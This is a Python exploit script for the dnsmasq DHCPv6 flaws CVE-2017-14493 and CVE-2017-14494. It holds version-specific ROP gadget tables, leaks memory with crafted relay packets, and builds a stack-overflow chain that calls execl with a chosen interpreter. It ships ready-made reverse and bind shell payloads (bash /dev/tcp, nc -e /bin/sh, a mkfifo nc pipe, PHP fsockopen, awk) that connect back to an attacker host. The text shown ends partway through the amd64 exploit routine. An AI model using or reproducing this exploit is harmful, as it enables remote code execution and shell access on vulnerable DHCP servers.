#!/usr/bin/env python

from base import Base
from argparse import ArgumentParser
from sys import exit
from scapy.all import sendp, sniff, Ether, IPv6, UDP, DHCP6_Solicit, DHCP6OptRapidCommit, DHCP6OptOptReq
from scapy.all import DHCP6OptElapsedTime, DHCP6OptClientId, DHCP6OptIA_NA, DHCP6_Reply, DHCP6OptServerId
from socket import socket, AF_INET6, SOCK_DGRAM, SOL_SOCKET, SO_RCVBUF, inet_pton
from random import randint
from netaddr import EUI
from tm import ThreadManager
from time import sleep
from binascii import unhexlify
from ipaddress import IPv6Address
from os import stat
from select import select

tm = ThreadManager(3)

# Architecture i386 segments address

# dnsmasq/2.77 segments address without PIE
# 0x08049fa0 - 0x0807e4e2 is .text
# 0x08097240 - 0x08098072 is .data

# dnsmasq/2.76 segments address without PIE
# 0x08049f10 - 0x0807d372 is .text
# 0x08096240 - 0x08097052 is .data

# dnsmasq/2.75 segments address without PIE
# 0x08049ee0 - 0x0807b7d2 is .text
# 0x08093240 - 0x08093f5c is .data

# dnsmasq/2.74 segments address without PIE
# 0x08049ee0 - 0x0807b7d2 is .text
# 0x08093240 - 0x08093f5c is .data

# dnsmasq/2.73 segments address without PIE
# 0x08049f30 - 0x0807bca2 is .text
# 0x08094240 - 0x08094f5c is .data

# Architecture amd64 segments address

# dnsmasq/2.77 segments address without PIE
# 0x0000000000402e00 is .text
# 0x000000000064a480 is .data


# NOP
NOP = {
    "i386": 0x90909090, 
    "amd64": 0x9090909090909090,
    "arm": 0x90909090
}


# CRASH
CRASH = {
    "i386": 0x41414141,
    "amd64": 0x4141414141414141,
    "arm": 0x41414141
}


# JUNK
JUNK = {
    "i386": {
        "2.77": 24,
        "2.76": 24,
        "2.75": 24,
        "2.74": 24,
        "2.73": 24
    },
    "amd64": {
        "2.77": 32,
        "2.76": 32,
        "2.75": 32,
        "2.74": 32,
        "2.73": 32
    },
    "arm": {
        "2.77": 24,
        "2.76": 24,
        "2.75": 24,
        "2.74": 24,
        "2.73": 24,
        "2.72": 24
    }
}


# Segment .text without PIE
TEXT = {
    "i386": {
        "2.77": 0x08049fa0,
        "2.76": 0x08049f10,
        "2.75": 0x08049ee0,
        "2.74": 0x08049ee0,
        "2.73": 0x08049f30
    },
    "amd64": {
        "2.77": 0x0000000000402e00,
        "2.76": 0x0000000000402d30
    },
    "arm": {
        "2.77": 0x00012088,
        "2.76": 0x00011ff8,
        "2.75": 0x00011ff8,
        "2.74": 0x00011ff8,
        "2.73": 0x00011ff8,
        "2.72": 0x00011f38
    }
}


# Segment .data without PIE
DATA = {
    "i386": {
        "2.77": 0x08097240,
        "2.76": 0x08096240,
        "2.75": 0x08093240,
        "2.74": 0x08093240,
        "2.73": 0x08094240
    },
    "amd64": {
        "2.77": 0x000000000064a480,
        "2.76": 0x0000000000648460
    },
    "arm": {
        "2.77": 0x0005e238,
        "2.76": 0x0005d22c,
        "2.75": 0x0005b22c,
        "2.74": 0x0005b22c,
        "2.73": 0x0005b22c,
        "2.72": 0x0005a220
    }
}


# Execl address without PIE
EXECL = {
    "i386": {
        "2.77": 0x0806d0af,
        "2.76": 0x0806c23c,
        "2.75": 0x0806c00e,
        "2.74": 0x0806c00e,
        "2.73": 0x0806c78e
    },
    "amd64": {
        "2.77": 0x0000000000427b30,
        "2.76": 0x0000000000426a36
    },
    "arm": {
        "2.77": 0x00035254,
        "2.76": 0x00034284,
        "2.75": 0x000342d4,
        "2.74": 0x000342d4,
        "2.73": 0x00034b34,
        "2.72": 0x00034170
    }
}


# Value of EAX in CMP operation
CMP_EAX = {
    "2.77": 0x0000000000219ec2,
    "2.76": 0x0000000000219212
}


# ROP gadgets without PIE
ROP = {
    "i386": {
        "2.77": {
            "pop all": 0x0804a164,  # pop eax ; pop ebx ; pop esi ; ret
            "mov": 0x0804d793       # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
        },
        "2.76": {
            "pop all": 0x0804a0d4,  # pop eax ; pop ebx ; pop esi ; ret
            "mov": 0x0804d653       # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
        },
        "2.75": {
            "pop eax": 0x0805cbfa,  # pop eax ; ret
            "pop ebx": 0x08049641,  # pop ebx ; ret
            "mov": 0x0804d433       # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
        },
        "2.74": {
            "pop eax": 0x0805cbfa,  # pop eax ; ret
            "pop ebx": 0x08049641,  # pop ebx ; ret
            "mov": 0x0804d433       # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
        },
        "2.73": {
            "pop eax": 0x0808310c,  # pop eax ; ret
            "pop ebx": 0x08049681,  # pop ebx ; ret
            "mov": 0x0804d903       # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
        },
    },
    "amd64": {
        "2.77": {
            "pop rax": 0x000000000042213c,  # pop rax ; add dh, dh ; ret
            "pop rbp": 0x0000000000402eb6,  # pop rbp ; ret
            "pop rbx": 0x000000000040ae5c,  # pop rbx ; ret
            "mov ecx": 0x000000000040ec0c,  # mov ecx, edi ; shl eax, cl ; or dword ptr [rdx], eax ; ret
            "mov r8d": 0x000000000040e223,  # mov r8d, ebx ; jne 0x40e239 ; pop rbx ; pop rbp ; pop r12 ; ret
            "pop rdx": 0x0000000000402fb1,  # pop rdx ; ret
            "pop rdi": 0x0000000000403439,  # pop rdi; ret
            "pop rsi": 0x00000000004038eb,  # pop rsi; ret
            "cmp": 0x0000000000432021,      # cmp eax, 0x219ec2 ; ret
            "mov": 0x00000000004338f9       # mov qword ptr [rsi + 0x70], rdi ; ret
        },
        "2.76": {
            "pop rax": 0x0000000000424e54,  # pop rax ; ret
            "pop rbp": 0x0000000000402de6,  # pop rbp ; ret
            "pop rbx": 0x000000000040ac9c,  # pop rbx ; ret
            "mov ecx": 0x000000000040e82c,  # mov ecx, edi ; shl eax, cl ; or dword ptr [rdx], eax ; ret
            "mov r8d": 0x000000000040ddd3,  # mov r8d, ebx ; jne 0x40dde9 ; pop rbx ; pop rbp ; pop r12 ; ret
            "pop rdx": 0x0000000000402ee1,  # pop rdx ; ret
            "pop rdi": 0x00000000004030b1,  # pop rdi ; ret
            "pop rsi": 0x000000000040376c,  # pop rsi ; ret
            "cmp": 0x0000000000430c71,      # cmp eax, 0x219212 ; ret
            "mov": 0x00000000004324f9       # mov qword ptr [rsi + 0x70], rdi ; ret
        }
    },
    "arm": {
        "2.77": {
            "pop r1": 0x00046370,  # pop {r1, pc}
            "pop r3": 0x000119f8,  # pop {r3, pc}
            "pop r4": 0x0001599c,  # pop {r4, pc}
            "pop r5": 0x0001caec,  # pop {r4, r5, pc}
            "pop r6": 0x000121bc,  # pop {r4, r5, r6, pc}
            "ldr r0": 0x00043d80,  # ldr r0, [r3, #0x90] ; pop {r4, pc}
            "ldr r2": 0x00039168,  # ldr r2, [r5] ; ldr r3, [r4, #4] ; cmp r2, r3 ; beq #0x39194 ; mov r0, #0 ; pop {r4, r5, r6, pc}
            "str": 0x0003478c      # str r3, [r4] ; pop {r4, pc}
         },
        "2.76": {
            "pop r1": 0x000450e8,  # pop {r1, pc}
            "pop r3": 0x0001198c,  # pop {r3, pc}
            "pop r4": 0x00015810,  # pop {r4, pc}
            "pop r5": 0x0001c74c,  # pop {r4, r5, pc}
            "pop r6": 0x0001212c,  # pop {r4, r5, r6, pc}
            "ldr r0": 0x00042adc,  # ldr r0, [r3, #0x90] ; pop {r4, pc}
            "ldr r2": 0x00038088,  # ldr r2, [r5] ; ldr r3, [r4, #4] ; cmp r2, r3 ; beq #0x39194 ; mov r0, #0 ; pop {r4, r5, r6, pc}
            "str": 0x00033974      # str r3, [r4] ; pop {r4, pc}
        },
        "2.75": {
            "pop r1": 0x00043800,  # pop {r1, pc}
            "pop r3": 0x0001198c,  # pop {r3, pc}
            "pop r4": 0x000155e4,  # pop {r4, pc}
            "pop r5": 0x0001cd6c,  # pop {r4, r5, pc}
            "pop r6": 0x0001212c,  # pop {r4, r5, r6, pc}
            "ldr r0": 0x000429f0,  # ldr r0, [r3, #0x90] ; pop {r4, pc}
            "ldr r2": 0x00037fe4,  # ldr r2, [r5] ; ldr r3, [r4, #4] ; cmp r2, r3 ; beq #0x39194 ; mov r0, #0 ; pop {r4, r5, r6, pc}
            "str": 0x0003398c      # str r3, [r4] ; pop {r4, pc}
        },
        "2.74": {
            "pop r1": 0x00043800,  # pop {r1, pc}
            "pop r3": 0x0001198c,  # pop {r3, pc}
            "pop r4": 0x000155e4,  # pop {r4, pc}
            "pop r5": 0x0001cd6c,  # pop {r4, r5, pc}
            "pop r6": 0x0001212c,  # pop {r4, r5, r6, pc}
            "ldr r0": 0x000429f0,  # ldr r0, [r3, #0x90] ; pop {r4, pc}
            "ldr r2": 0x00037fe4,  # ldr r2, [r5] ; ldr r3, [r4, #4] ; cmp r2, r3 ; beq #0x39194 ; mov r0, #0 ; pop {r4, r5, r6, pc}
            "str": 0x0003398c      # str r3, [r4] ; pop {r4, pc}
        },
        "2.73": {
            "pop r1": 0x00043dc8,  # pop {r1, pc}
            "pop r3": 0x0001198c,  # pop {r3, pc}
            "pop r4": 0x00015b60,  # pop {r4, pc}
            "pop r5": 0x0001d2e8,  # pop {r4, r5, pc}
            "pop r6": 0x0001212c,  # pop {r4, r5, r6, pc}
            "ldr r0": 0x000432c0,  # ldr r0, [r3, #0x90] ; pop {r4, pc}
            "ldr r2": 0x000388b8,  # ldr r2, [r5] ; ldr r3, [r4, #4] ; cmp r2, r3 ; beq #0x39194 ; mov r0, #0 ; pop {r4, r5, r6, pc}
            "str": 0x000341ec      # str r3, [r4] ; pop {r4, pc}
        },
        "2.72": {
            "pop r1": 0x0004292c,  # pop {r1, pc}
            "pop r3": 0x000118f0,  # pop {r3, pc}
            "pop r4": 0x00015774,  # pop {r4, pc}
            "pop r5": 0x0001cd58,  # pop {r4, r5, pc}
            "pop r6": 0x0001206c,  # pop {r4, r5, r6, pc}
            "ldr r0": 0x00042464,  # ldr r0, [r3, #0x88] ; pop {r4, pc}
            "ldr r2": 0x00037e78,  # ldr r2, [r5] ; ldr r3, [r4, #4] ; cmp r2, r3 ; beq #0x39194 ; mov r0, #0 ; pop {r4, r5, r6, pc}
            "str": 0x00033828      # str r3, [r4] ; pop {r4, pc}
        }
    }
}

LEAK_BYTES = 0xFF00

Base = Base()
Base.print_banner()

parser = ArgumentParser(description='Exploit for dnsmasq CVE-2017-14493 and CVE-2017-14494')

parser.add_argument('-i', '--interface', help='Set interface name for send packets')
parser.add_argument('-e', '--exploit', action='store_true', help='Exploit (CVE-2017-14493) works only if ' +
                                                                 'Stack cookie and PIE disabled')
parser.add_argument('-l', '--info_leak', action='store_true', help='Information leakage (CVE-2017-14494)')
parser.add_argument('-t', '--target', type=str, help='Set target IPv6 address', required=True)
parser.add_argument('-p', '--target_port', type=int, help='Set target port, default=547', default=547)
parser.add_argument('-a', '--architecture', help='Set architecture (i386 or amd64), default=i386', default='i386')
parser.add_argument('-v', '--version', help='Set dnsmasq version (2.73, 2.74, 2.75, 2.76, 2.77),' +
                                            ' default=2.77', default='2.77')

parser.add_argument('--interpreter', type=str, help='Set path to interpreter on target, ' +
                                                    'default="/bin/bash"', default='/bin/bash')
parser.add_argument('--interpreter_arg', type=str, help='Set interpreter argument, default="-c"', default='-c')

parser.add_argument('--payload', help='Set payload (bind_awk, reverse_awk, reverse_bash, reverse_php, reverse_nc, ' +
                                      'reverse_nce), default=reverse_nc', default='reverse_nc')
parser.add_argument('--command', type=str, help='Set command for executing on target')

parser.add_argument('--bind_port', type=int, help='Set bind port, default=4444', default=4444)
parser.add_argument('--reverse_port', type=int, help='Set reverse port, default=4444', default=4444)
parser.add_argument('--reverse_host', type=str, help='Set reverse host')

args = parser.parse_args()

current_network_interface = None
if args.interface is None:
    current_network_interface = Base.netiface_selection()
else:
    current_network_interface = args.interface

macsrc = Base.get_netiface_mac_address(current_network_interface)
if macsrc is None:
    macsrc = "ff:ff:ff:ff:ff:ff"

ipv6_first = Base.get_netiface_ipv6_address(current_network_interface, 0)
ipv6_second = Base.get_netiface_ipv6_address(current_network_interface, 1)

ipv6src_link = ""
ipv6src = ""

if ipv6_first is None or ipv6_second is None:
    print Base.c_error + "Please add IPv6 address to interface: " + current_network_interface
    exit(1)
else:
    if ipv6_first.startswith("fe80"):
        ipv6src_link = ipv6_first
        ipv6src = ipv6_second
    elif ipv6_second.startswith("fe80"):
        ipv6src_link = ipv6_second
        ipv6src = ipv6_first
    else:
        print Base.c_error + "Please set IPv6 link local address to interface: " + current_network_interface

ipv6_first = None
ipv6_second = None

dhcpv6_server_duid = None
dhcpv6_server_ipv6_link = None
dhcpv6_server_mac = None

eth = Ether()
ipv6 = IPv6()
udp = UDP()

host = str(args.target)
port = int(args.target_port)

architecture = ""
if args.architecture == "i386" or "amd64" or "arm":
    architecture = args.architecture
else:
    print Base.c_error + "Bad architecture: " + args.architecture + ". Allow only arm, i386 or amd64!"
    exit(1)

dnsmasq_version = ""
if args.version == "2.72" or "2.73" or "2.74" or "2.75" or "2.76" or "2.77":
    dnsmasq_version = args.version
else:
    print Base.c_error + "Bad dnsmasq version: " + args.version + " allow only 2.72, 2.73, 2.74, 2.75, 2.76 or 2.77!"
    exit(1)

interpreter = str(args.interpreter)
interpreter_arg = str(args.interpreter_arg)

bind_port = str(4444)
reverse_port = str(4444)

if 0 < int(args.bind_port) < 65535:
    bind_port = str(args.bind_port)
else:
    print Base.c_error + "Bad bind port: " + str(args.bind_port) + " allow only 1 ... 65534 ports"

if 0 < int(args.reverse_port) < 65535:
    reverse_port = str(args.reverse_port)
else:
    print Base.c_error + "Bad reverse port: " + str(args.reverse_port) + " allow only 1 ... 65534 ports"

reverse_host = "127.0.0.1"
if args.reverse_host is None:
    reverse_host = Base.get_netiface_ip_address(current_network_interface)
    if reverse_host is None:
        reverse_host = "127.0.0.1"
else:
    reverse_host = str(args.reverse_host)

# Payloads
rstr = Base.make_random_string(3)

# Bind payloads
bind_awk = "awk 'BEGIN{s=\"/inet/tcp/" + bind_port + \
           "/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"

# Reverse payloads
reverse_awk = "awk 'BEGIN{s=\"/inet/tcp/0/" + reverse_host + "/" + reverse_port + \
              "\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
reverse_bash = "bash -i >& /dev/tcp/" + reverse_host + "/" + reverse_port + " 0>&1"
reverse_php = "php -r '$sock=fsockopen(\""+reverse_host+"\","+reverse_port+");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
reverse_nc = "rm /tmp/" + rstr + ";mkfifo /tmp/" + rstr + ";cat /tmp/" + rstr + "|/bin/sh -i 2>&1|nc " + \
             reverse_host + " " + reverse_port + " >/tmp/" + rstr
reverse_nce = "nc -e /bin/sh " + reverse_host + " " + reverse_port

payload = ""
if args.command is not None:
    payload = args.command
else:
    if args.payload == "bind_awk": payload = bind_awk
    elif args.payload == "reverse_awk": payload = reverse_awk
    elif args.payload == "reverse_bash": payload = reverse_bash
    elif args.payload == "reverse_php": payload = reverse_php
    elif args.payload == "reverse_nc": payload = reverse_nc
    elif args.payload == "reverse_nce": payload = reverse_nce
    else:
        print Base.c_error + "Bad payload: " + args.version + " allow only bind_awk, reverse_awk, reverse_bash, " + \
              "reverse_php, reverse_nc, reverse_nce!"
        exit(1)


def get_dhcpv6_server_duid():
    if dhcpv6_server_duid is None:
        print Base.c_info + "Wait for receive DHCPv6 server DUID..."
        tm.add_task(recv_dhcpv6_reply)
        sleep(3)
        send_dhcpv6_solicit()
        sleep(5)

        count_solicit_reqeusts = 0
        while count_solicit_reqeusts < 2:
            if dhcpv6_server_duid is None:
                send_dhcpv6_solicit()
                count_solicit_reqeusts += 1
                sleep(5)
            else:
                break

        if dhcpv6_server_duid is None:
            print Base.c_error + "Can not get DHCPv6 server DUID!"
            return False
        else:
            print Base.c_success + "DHCPv6 server MAC:       " + str(dhcpv6_server_mac)
            print Base.c_success + "DHCPv6 server IPv6 link: " + str(dhcpv6_server_ipv6_link)
            print Base.c_success + "DHCPv6 server DUID:      " + str(dhcpv6_server_duid).encode("hex")
            return True
    else:
        return True


def send_dhcpv6_solicit():
    sol = DHCP6_Solicit()
    rc = DHCP6OptRapidCommit()
    opreq = DHCP6OptOptReq()
    et = DHCP6OptElapsedTime()
    cid = DHCP6OptClientId()
    iana = DHCP6OptIA_NA()

    rc.optlen = 0
    opreq.optlen = 4
    iana.optlen = 12
    iana.T1 = 0
    iana.T2 = 0
    cid.optlen = 10
    sol.trid = randint(0, 16777215)

    eth.src = macsrc
    eth.dst = "33:33:00:01:00:02"

    ipv6.src = ipv6src_link
    ipv6.dst = "ff02::1:2"

    udp.sport = 546
    udp.dport = 547

    cid.duid = ("00030001" + str(EUI(macsrc)).replace("-", "")).decode("hex")

    pkt = eth / ipv6 / udp / sol / iana / rc / et / cid / opreq

    try:
        sendp(pkt, iface=current_network_interface, verbose=False)
        print Base.c_info + "Send Solicit request to: [ff02::1:2]:547"
    except:
        print Base.c_error + "Do not send Solicit request."
        exit(1)


def recv_dhcpv6_reply():
    sniff(iface=current_network_interface, stop_filter=dhcpv6_callback, count=1,
          filter="udp and src port 547 and dst port 546 and ip6 dst host " + ipv6src_link)


def dhcpv6_callback(pkt):
    global dhcpv6_server_mac
    global dhcpv6_server_ipv6_link
    global dhcpv6_server_duid

    if pkt.haslayer(DHCP6_Reply):
        if pkt[DHCP6OptServerId].duid is None:
            return False
        else:
            dhcpv6_server_mac = pkt[Ether].src
            dhcpv6_server_ipv6_link = pkt[IPv6].src
            dhcpv6_server_duid = pkt[DHCP6OptServerId].duid
            return True
    else:
        return False


def gen_option(option, data, length=None):
    if length is None:
        length = len(data)

    return b"".join([
        Base.pack16(option),
        Base.pack16(length),
        data])


def add_string_in_data(addr_in_data, string):
    a = architecture
    v = dnsmasq_version
    rop_chain = ""

    if architecture == "i386" or "arm":
        if len(string) % 4 == 0:
            string = string + "\x00" * 4
        else:
            string = string + "\x00" * (4 - (len(string) % 4))

    if architecture == "amd64":
        if len(string) % 8 == 0:
            string = string + "\x00" * 8
        else:
            string = string + "\x00" * (8 - (len(string) % 8))

    if architecture == "i386":

        if dnsmasq_version == "2.77" or "2.76":
            for x in range(0, len(string), 4):
                rop_chain += Base.pack32(ROP[a][v]["pop all"])  # pop eax ; pop ebx ; pop esi ; ret
                rop_chain += Base.pack32(addr_in_data + x)      # address in .data
                rop_chain += string[x:x + 4]                    # 4 byte of string
                rop_chain += Base.pack32(NOP[architecture])     # NOP (0x90909090) in esi
                rop_chain += Base.pack32(ROP[a][v]["mov"])      # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
                rop_chain += Base.pack32(NOP[architecture])     # NOP (0x90909090) in ebx
                rop_chain += Base.pack32(NOP[architecture])     # NOP (0x90909090) in esi

        if dnsmasq_version == "2.75" or "2.74" or "2.73":
            for x in range(0, len(string), 4):
                rop_chain += Base.pack32(ROP[a][v]["pop eax"])  # pop eax ; ret
                rop_chain += Base.pack32(addr_in_data + x)      # address in .data
                rop_chain += Base.pack32(ROP[a][v]["pop ebx"])  # pop ebx ; ret
                rop_chain += string[x:x + 4]                    # 4 byte of string
                rop_chain += Base.pack32(ROP[a][v]["mov"])      # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
                rop_chain += Base.pack32(NOP[architecture])     # NOP (0x90909090) in ebx
                rop_chain += Base.pack32(NOP[architecture])     # NOP (0x90909090) in esi

    if architecture == "amd64":

        if v == "2.77" or "2.76":
            for x in range(0, len(string), 8):
                rop_chain += Base.pack64(ROP[a][v]["pop rsi"])     # pop rsi ; ret
                rop_chain += Base.pack64(addr_in_data + x - 0x70)  # address in .data - 0x70
                rop_chain += Base.pack64(ROP[a][v]["pop rdi"])     # pop rdi ; ret
                rop_chain += string[x:x + 8]                       # 8 byte of string
                rop_chain += Base.pack64(ROP[a][v]["mov"])         # mov qword ptr [rsi + 0x70], rdi ; ret

    if architecture == "arm":

        if dnsmasq_version == "2.77" or "2.76" or "2.75" or "2.74" or "2.73" or "2.72":
            for x in range(0, len(string), 4):
                rop_chain += Base.pack32(ROP[a][v]["pop r3"])  # pop {r3, pc}
                rop_chain += string[x:x + 4]                   # r3 = 4 byte of string
                rop_chain += Base.pack32(ROP[a][v]["pop r4"])  # pop {r4, pc}
                rop_chain += Base.pack32(addr_in_data + x)     # r4 = address in .data
                rop_chain += Base.pack32(ROP[a][v]["str"])     # str r3, [r4] ; pop {r4, pc}
                rop_chain += Base.pack32(NOP[architecture])    # NOP (0x90909090) in r4

    return rop_chain


def register_management(architecture, dnsmasq_version, register_name, register_value, register_address=0):
    result = ""
    v = dnsmasq_version
    r = register_name
    address = DATA[architecture][dnsmasq_version]

    if architecture == "amd64":
        if r == "r8d":
            if v == "2.77" or "2.76":
                # RAX = 0x219ec2
                # pop rax; ret
                result += register_management(architecture, dnsmasq_version, "rax", CMP_EAX[dnsmasq_version])

                # RBX = register_value
                # pop rbx; ret
                result += register_management(architecture, dnsmasq_version, "rbx", register_value)

                # ZF = 0
                # cmp eax, 0x219ec2 ; ret
                result += Base.pack64(ROP[architecture][dnsmasq_version]["cmp"])

                # R8D = register_value
                # mov r8d, ebx ; jne 0x40e239 ; pop rbx ; pop rbp ; pop r12 ; ret
                result += Base.pack64(ROP[architecture][dnsmasq_version]["mov r8d"])
                result += Base.pack64(CRASH[architecture])  # RBX = 0x4141414141414141
                result += Base.pack64(CRASH[architecture])  # RBP = 0x4141414141414141
                result += Base.pack64(CRASH[architecture])  # R12 = 0x4141414141414141

        if r == "rax" or "rbp" or "rbx" or "rdx" or "rdi" or "rsi":
            if v == "2.77" or "2.76":
                # <register_name> = register_value
                # pop <register_name>; ret
                result += Base.pack64(ROP[architecture][dnsmasq_version]["pop " + register_name])
                result += Base.pack64(register_value)

        if r == "ecx":
            if v == "2.77" or "2.76":
                # RDI = register_value
                # pop rdi; ret
                result += register_management(architecture, dnsmasq_version, "rdi", register_value)

                # RDX = address in .data
                # pop rdx; ret
                result += register_management(architecture, dnsmasq_version, "rdx", address)

                # ECX = register_value
                # mov ecx, edi ; shl eax, cl ; or dword ptr [rdx], eax ; ret
                result += Base.pack64(ROP[architecture][dnsmasq_version]["mov ecx"])

        return result

    elif architecture == "arm":
        if r == "r0":
            if v == "2.77" or "2.76" or "2.75" or "2.74" or "2.73" or "2.72":
                result += register_management(architecture, dnsmasq_version, "r3", register_value)
                result += register_management(architecture, dnsmasq_version, "r4", register_address)
                result += Base.pack32(ROP[architecture][dnsmasq_version]["str"])
                result += Base.pack32(NOP[architecture])    # r4 = 0x90909090
                if v == "2.72":
                    result += register_management(architecture, dnsmasq_version, "r3", register_address - 0x88)
                else:
                    result += register_management(architecture, dnsmasq_version, "r3", register_address - 0x90)

                # # ldr r0, [r3, #0x90] ; pop {r4, pc}
                result += Base.pack32(ROP[architecture][dnsmasq_version]["ldr r0"])
                result += Base.pack32(NOP[architecture])    # r4 = 0x90909090

        if r == "r1":
            if v == "2.77" or "2.76" or "2.75" or "2.74" or "2.73" or "2.72":
                # r1 = register_value
                # pop {r1, pc}
                result += Base.pack32(ROP[architecture][dnsmasq_version]["pop r1"])
                result += Base.pack32(register_value)

        if r == "r2":
            if v == "2.77" or "2.76" or "2.75" or "2.74" or "2.73" or "2.72":
                result += register_management(architecture, dnsmasq_version, "r3", register_value)
                result += register_management(architecture, dnsmasq_version, "r4", register_address)
                result += Base.pack32(ROP[architecture][dnsmasq_version]["str"])
                result += Base.pack32(register_address)    # r4 = 0x90909090

                result += register_management(architecture, dnsmasq_version, "r5", register_address)
                result += register_management(architecture, dnsmasq_version, "r4", register_address)

                # ldr r2, [r5] ; ldr r3, [r4, #4] ; cmp r2, r3 ; beq #0x39194 ; mov r0, #0 ; pop {r4, r5, r6, pc}
                result += Base.pack32(ROP[architecture][dnsmasq_version]["ldr r2"])
                result += Base.pack32(NOP[architecture])    # r4 = 0x90909090
                result += Base.pack32(NOP[architecture])    # r5 = 0x90909090
                result += Base.pack32(NOP[architecture])    # r6 = 0x90909090

        if r == "r3":
            if v == "2.77" or "2.76" or "2.75" or "2.74" or "2.73" or "2.72":
                # r3 = register_value
                # pop {r3, pc}
                result += Base.pack32(ROP[architecture][dnsmasq_version]["pop r3"])
                result += Base.pack32(register_value)

        if r == "r4":
            if v == "2.77" or "2.76" or "2.75" or "2.74" or "2.73" or "2.72":
                # r4 = register_value
                # pop {r4, pc}
                result += Base.pack32(ROP[architecture][dnsmasq_version]["pop r4"])
                result += Base.pack32(register_value)

        if r == "r5":
            if v == "2.77" or "2.76" or "2.75" or "2.74" or "2.73" or "2.72":
                # pop {r4, r5, pc}
                result += Base.pack32(ROP[architecture][dnsmasq_version]["pop r5"])
                result += Base.pack32(register_address)   # r4 = <register_address>
                result += Base.pack32(register_value)     # r5 = <register_value>

        if r == "r6":
            if v == "2.77" or "2.76" or "2.75" or "2.74" or "2.73" or "2.72":
                # # pop {r4, r5, r6, pc}
                result += Base.pack32(ROP[architecture][dnsmasq_version]["pop r6"])
                result += Base.pack32(register_address)   # r4 = <register_address>
                result += Base.pack32(register_address)   # r5 = <register_address>
                result += Base.pack32(register_value)     # r6 = <register_value>

        return result

    else:
        return result


def inner_pkg(duid):
        return b"".join([
        Base.pack8(5),                                   # Type = DHCP6RENEW
        Base.pack8(0), Base.pack16(1337),                # ID
        gen_option(2, duid),                             # DHCP Server DUID
        gen_option(1, "", length=(LEAK_BYTES - 8 - 18))  # Client ID
    ])


def info_leak():
    # Receive info leak reply
    sock = socket(AF_INET6, SOCK_DGRAM)
    sock.setsockopt(SOL_SOCKET, SO_RCVBUF, LEAK_BYTES)
    sock.bind(('::', 547))

    duid = unhexlify(str(dhcpv6_server_duid).encode("hex"))
    assert len(duid) == 14

    ipv6_client_addr = inet_pton(AF_INET6, str(IPv6Address(unicode(ipv6src)) + randint(1, 10)))
    pkg = b"".join([
        Base.pack8(12),  # DHCP6RELAYFORW
        '?',
        # Client addr
        ipv6_client_addr,
        '_' * (33 - 17),  # Skip random data.
        # Option 9 - OPTION6_RELAY_MSG
        gen_option(9, inner_pkg(duid), length=LEAK_BYTES),
    ])

    eth.src = macsrc
    eth.dst = dhcpv6_server_mac

    ipv6.src = ipv6src
    ipv6.dst = host

    udp.sport = 546
    udp.dport = 547

    pkt = eth / ipv6 / udp / pkg

    try:
        sendp(pkt, iface=current_network_interface, verbose=False)
        print Base.c_info + "Send info leak request to: [" + host + "]:" + str(udp.dport)
    except:
        print Base.c_error + "Do not send info leak request."
        exit(1)

    with open('response.bin', 'wb') as response_file:
        sock.setblocking(0)
        ready = select([sock], [], [], 15)
        if ready[0]:
            response_file.write(sock.recvfrom(LEAK_BYTES)[0])
        else:
            print Base.c_error + "Can not receive info leak response!"
            sock.close()
            exit(1)

    info_leak_size = stat('response.bin').st_size
    if info_leak_size == LEAK_BYTES:
        print Base.c_success + "Length info leak response: " + str(hex(info_leak_size))
    else:
        print Base.c_error + "Bad length of info leak response: " + str(hex(info_leak_size))

    print Base.c_info + "Dump info leak response to file: response.bin"
    sock.close()


def exploit():
    option_79 = ""
    if architecture == "i386":

        interpreter_addr = DATA[architecture][dnsmasq_version]
        interpreter_arg_addr = interpreter_addr + len(interpreter) + (4 - (len(interpreter) % 4)) + 4
        payload_addr = interpreter_arg_addr + len(interpreter_arg) + (4 - (len(interpreter_arg) % 4)) + 4

        # print "Interpreter address: " + str(hex(interpreter_addr))
        # print "Interpreter argument address: " + str(hex(interpreter_arg_addr))
        # print "Payload address: " + str(hex(payload_addr))

        option_79 += Base.pack16(0)  # mac_type

        option_79 += "A" * JUNK[architecture][dnsmasq_version]

        option_79 += Base.pack32(NOP[architecture])  # EBX = 0x90909090
        option_79 += Base.pack32(NOP[architecture])  # ESI = 0x90909090
        option_79 += Base.pack32(NOP[architecture])  # EDI = 0x90909090

        # option_79 += Base.pack32(CRASH[architecture])  # crash for debug
        option_79 += add_string_in_data(interpreter_addr, interpreter)
        option_79 += add_string_in_data(interpreter_arg_addr, interpreter_arg)
        option_79 += add_string_in_data(payload_addr, payload)

        # option_79 += Base.pack32(CRASH[architecture])  # crash for debug
        option_79 += Base.pack32(EXECL[architecture][dnsmasq_version])  # address of execl
        option_79 += Base.pack32(interpreter_addr)                      # address of interpreter
        option_79 += Base.pack32(interpreter_addr)                      # address of interpreter
        option_79 += Base.pack32(interpreter_arg_addr)                  # address of interpreter argument
        option_79 += Base.pack32(payload_addr)                          # address of payload

    elif architecture == "amd64":

        interpreter_addr = DATA[architecture][dnsmasq_version] + 0x64
        interpreter_arg_addr = interpreter_addr + len(interpreter) + (8 - (len(interpreter) % 8)) + 8
        payload_addr = interpreter_arg_addr + len(interpreter_arg) + (8 - (len(interpreter_arg) % 8)) + 8

        # print "Interpreter address: " + str(hex(interpreter_addr))
        # print "Interpreter argument address: " + str(hex(interpreter_arg_addr))
        # print "Payload address: " + str(hex(payload_addr))

        option_79 += Base.pack16(0)  # mac_type

        option_79 += "A" * JUNK[architecture][dnsmasq_version]

        option_79 += Base.pack64(NOP[architecture])  # RBX = 0x9090909090909090
        option_79 += Base.pack64(NOP[architecture])  # RBP = 0x9090909090909090
        option_79 += Base.pack64(NOP[architecture])  # R12 = 0x9090909090909090
        option_79 += Base.pack64(NOP[architecture])  # R13 = 0x9090909090909090
        option_79 += Base.pack64(NOP[architecture])  # R14 = 0x9090909090909090
        option_79 += Base.pack64(NOP[architecture])  # R15 = 0x9090909090909090

        # option_79 += Base.pack64(CRASH[architecture])  # crash for debug

        # R8D = 0x0000000000000000
        option_79 += register_management(architecture, dnsmasq_version, "r8d", 0x0000000000000000)

        # Add strings to .data
        option_79 += add_string_in_data(interpreter_addr, interpreter)
